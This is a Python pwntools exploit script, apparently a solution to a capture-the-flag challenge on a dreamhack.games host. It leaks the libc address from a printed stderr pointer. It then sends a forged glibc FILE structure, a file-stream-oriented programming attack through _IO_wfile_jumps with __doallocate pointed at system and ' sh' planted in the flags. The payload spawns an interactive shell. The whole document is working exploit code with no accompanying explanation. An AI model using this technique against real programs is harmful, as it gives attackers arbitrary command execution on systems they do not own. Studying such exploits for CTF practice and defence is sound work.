#!/usr/bin/env python3

from pwn import *

exe = ELF("./main_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host8.dreamhack.games", 15834)

    return r


def main():
    p = conn()
    p.recvuntil (b'stderr: ')
    stderr = p.recvline ()[:-1]
    stderr = int (stderr.decode(), 16)
    libc.address = stderr - libc.sym['_IO_2_1_stderr_']
    print ("The address of libc is: ", hex (libc.address))

    fake_file = stderr
    payload = flat(
    {
        # fake_file->file._flags
        # requirements:
        # (_flags & 0x0002) == 0
        # (_flags & 0x0008) == 0
        # (_flags & 0x0800) == 0
        # basic approach with spaces:
        # " sh\x00"
        # 0x20, 0x73, 0x68, 0x00
        0x00: b" sh\x00",
        # fake_file->file._wide_data->_IO_write_base
        0x18: p64(0),
        # fake_file->file._IO_write_base
        0x20: p64(0),
        # fake_file->file._IO_write_ptr
        0x28: p64(1),
        # fake_file->file._wide_data->_IO_buf_base
        0x30: p64(0),
        # fake_file->file._wide_data->_wide_vtable->__doallocate
        0x68: libc.symbols["system"],
        # fake_file->file._lock
        0x88: libc.symbols["_IO_stdfile_0_lock"],
        # fake_file->file._wide_data
        0xA0: fake_file,
        # fake_file->file._mode
        0xC0: p64(0),
        # fake_file->vtable
        0xD8: libc.symbols["_IO_wfile_jumps"],
        # fake_file->file._wide_data->_wide_vtable
        0xE0: fake_file,
    })

    p.sendafter (b'FSOP?: ', payload)

    p.interactive()


if __name__ == "__main__":
    main()
